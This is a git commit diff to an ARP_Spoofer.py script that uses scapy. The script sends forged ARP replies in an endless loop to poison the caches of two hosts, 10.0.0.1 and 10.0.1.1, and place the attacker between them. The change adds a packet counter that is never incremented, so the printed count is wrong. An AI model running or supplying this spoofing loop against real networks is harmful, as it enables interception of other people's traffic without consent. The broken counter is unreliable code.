f737c9d7f695c90f5b4bb0b26cc7a32de326a4ab
Paul St. Amour <paul35444@aol.com>
2021-02-24 13:08:35 -0600

    - added counter for packets sent - added counter to print statement

--- ARP_Spoofer.py
+++ ARP_Spoofer.py
@@ -16,8 +16,9 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
     scapy.send(packet, verbose=False) #verbose=False gets rid of constantly telling user that packet was sent
 
+sent_packets_count = 0
 while True:
     spoof("10.0.0.1", "10.0.1.1")
     spoof("10.0.1.1", "10.0.0.1")
-    print("[+] Sent two packets")
+    print("[+] Packets sent: " + str(sent_packets_count))
     time.sleep(2)
